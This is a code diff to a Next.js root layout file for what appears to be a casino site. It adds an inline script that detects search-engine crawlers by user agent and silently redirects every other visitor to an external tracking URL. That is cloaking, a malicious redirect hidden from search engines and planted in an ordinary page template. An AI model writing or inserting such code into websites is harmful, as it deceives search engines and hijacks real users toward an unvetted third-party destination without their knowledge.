@@ -34,6 +34,21 @@ export default function RootLayout({
           content="la casino, la casino зеркало, la casino играть, la casino официальный сайт, ла казино, ля казино"
         />
         <link rel="canonical" href="/" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://copper-ray.com/?serial=61365830&creative_id=9330");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
         
       </head>
       
